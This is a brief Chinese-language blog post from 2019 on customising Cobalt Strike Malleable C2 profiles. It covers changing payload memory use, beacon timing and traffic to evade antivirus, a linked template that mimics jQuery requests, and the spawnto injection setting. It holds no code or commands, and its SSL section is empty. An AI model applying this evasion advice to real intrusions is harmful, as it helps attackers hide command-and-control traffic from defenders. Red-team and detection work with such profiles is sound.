自定义你的Malleable c2配置

发布 : 2019-08-18 分类 : cobaltstrike 浏览 :

为什么要自定义C2配置

cobaltstrike允许我们自定义c2配置以修改默认payload的行为，包括内存占用、回连时间、网络流量等。我们可以通过修改默认配置来修改payload的特征来达到躲避杀软检测。

配置文件

这里的配置文件来自github，可以以此为模版进行修改，链接如下：

https://github.com/threatexpress/malleable-c2

该配置文件旨在模拟jquery请求。

这里可以自定义配置文件名称，这个可以随便取一个，不会影响到payload的流量。

SSL证书

SpawnTo Process

spawnto用于设置注入进程，在实际操作过程中使用了几个进程，但是都无法注入，最后还是使用了默认进程。各位大佬可以测试下其他进程。
